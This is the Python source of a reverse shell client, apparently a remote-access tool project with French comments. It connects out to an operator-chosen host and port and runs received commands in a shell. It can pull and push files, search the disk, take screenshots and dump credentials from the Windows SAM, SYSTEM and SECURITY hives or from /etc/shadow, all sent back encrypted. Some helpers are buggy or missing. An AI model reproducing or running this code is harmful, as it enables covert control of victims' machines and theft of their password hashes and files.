import socket
import subprocess
import os
import sys
import platform
from time import sleep
from base64 import b64encode, b64decode
from aes_crypt import AESCipher  # Import de la classe AESCipher depuis le fichier aes_crypt
from datetime import datetime
import logging

# Configure logging
logging.basicConfig(
    filename='client.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
)

# pour le screenshot en fonction du systeme d'exploitation
if platform.system() == "Windows":
    from mss import mss
else:
    from PIL import ImageGrab

class ReverseShellClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.conn = None

    def start(self):
        while True:
            try:
                logging.info("Attempting to connect to server...")
                self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.conn.connect((self.host, self.port))
                logging.info("Connected to server")
                self.send_client_info()
                self.listen_for_commands()
            except Exception as e:
                logging.error(f"Connection error: {e}")
                sleep(10)

    def send_client_info(self):
        try:
            hostname = socket.gethostname()
            os_type = platform.system()
            client_info = f"{hostname}|{os_type}"
            self.send_large_data(client_info)
            logging.info(f"Sent client info: {client_info}")
        except Exception as e:
            logging.error(f"Failed to send client info: {e}")

    def listen_for_commands(self):
        try:
            while True:
                data = self.conn.recv(4096).decode("utf-8")
                if not data:
                    break
                decrypted_data = AESCipher.decrypt(data)
                logging.info(f"Received command: {decrypted_data}")
                if decrypted_data.lower() == "exit":
                    break
                elif decrypted_data.startswith("download"):
                    self.handle_download(decrypted_data)
                elif decrypted_data.startswith("upload"):
                    self.handle_upload(decrypted_data)
                elif decrypted_data.startswith("search"):
                    self.handle_search(decrypted_data)
                elif decrypted_data.startswith("hashdump"):
                    self.handle_hashdump()
                elif decrypted_data.startswith("screenshot"):
                    self.handle_screenshot()
                elif decrypted_data.startswith("ipconfig"):
                    logging.info("Handling ipconfig")
                    self.handle_ipconfig()
                else:
                    self.execute_command(decrypted_data)
        except Exception as e:
            logging.error(f"Error listening for commands: {e}")
        finally:
            self.conn.close()
            logging.info("Connection closed")

    def handle_download(self, command):
        file_path = command.split(" ", 1)[1]
        try:
            logging.info(f"Handling download for file: {file_path}")
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    self.conn.send(
                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
                            "utf-8"
                        )
                    )
            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
            logging.info(f"File {file_path} sent successfully")
        except Exception as e:
            logging.error(f"Failed to download {file_path}: {e}")
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def handle_upload(self, command):
        parts = command.split(" ", 2)
        file_path = parts[1]
        buffer_size = int(parts[2])
        try:
            logging.info(f"Handling upload for file: {file_path}")
            with open(file_path, "wb") as f:
                while True:
                    data = self.conn.recv(buffer_size)
                    decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
                    if decrypted_data == "EOF":
                        break
                    f.write(b64decode(decrypted_data))
            logging.info(f"File {file_path} uploaded successfully")
        except Exception as e:
            logging.error(f"Failed to upload {file_path}: {e}")
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def handle_search(self, command):
        file_name = command.split(" ", 1)[1]
        if os.name == "nt":
            command = f"dir /s /b {file_name}"
        else:
            command = f"find / -name {file_name}"
        logging.info(f"Handling search for file: {file_name}")
        result = self.run_system_command(command)
        self.send_large_data(result)

    def handle_hashdump(self):
        logging.info("Handling hashdump")
        if os.name == "nt":
            commands = [
                "reg save hklm\\sam C:\\Windows\\Temp\\sam && reg save hklm\\system C:\\Windows\\Temp\\system && reg save hklm\\security C:\\Windows\\Temp\\security",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sam'))\"",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\system'))\"",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\security'))\"",
            ]
            result = ""
            for cmd in commands:
                result += self.run_system_command(cmd) + "\n"
        else:
            try:
                result = self.run_system_command(
                    "sudo cat /etc/shadow || cat /etc/shadow"
                )
            except subprocess.CalledProcessError as e:
                result = f"Error: {e.output.decode('utf-8')}"
            except Exception as e:
                result = str(e)
        self.send_large_data(result)

    def handle_screenshot(self):
        try:
            timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
            file_name = f"screenshot_{timestamp}.png"
            logging.info(f"Taking screenshot: {file_name}")
            screenshot = ImageGrab.grab()
            screenshot.save(file_name)
            self.send_file(file_name)
            os.remove(file_name)  # Clean up the screenshot file after sending
            logging.info(f"Screenshot {file_name} sent and removed")
        except Exception as e:
            logging.error(f"Failed to take screenshot: {e}")
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def handle_ipconfig(self):
        try:
            if platform.system() == "Windows":
                command = "powershell -Command \"Get-NetIPAddress -InterfaceIndex 12\""
            else:
                command = "hostname -I | awk '{print $1}'"

            result = self.run_system_command(command)
            logging.info(f"ipconfig result: {result}")
            
            self.conn.send(AESCipher.encrypt(result).encode("utf-8") + AESCipher.encrypt("EOF").encode("utf-8"))
            logging.info("ipconfig handled successfully")
            
        except Exception as e:
            logging.error(f"Failed to handle ipconfig: {e}")
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def execute_command(self, command):
        try:
            logging.info(f"Executing command: {command}")
            result = self.run_system_command(command)
        except Exception as e:
            result = str(e)
        self.send_large_data(result)

    def send_large_data(self, data):
        chunks = [data[i : i + 8192] for i in range(0, len(data), 4096)]
        for chunk in chunks:
            self.conn.send(AESCipher.encrypt(chunk).encode("utf-8"))
        self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))

    def run_system_command(self, command):
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                logging.info(f"Command output: {stdout.decode('utf-8')}")
                return stdout.decode('utf-8')
            else:
                logging.error(f"Command error: {stderr.decode('utf-8')}")
                return stderr.decode('utf-8')
        except Exception as e:
            logging.error(f"Command execution failed: {e}")
            return str(e)



if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python client.py <HOST> <PORT>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    client = ReverseShellClient(host, port)
    client.start()
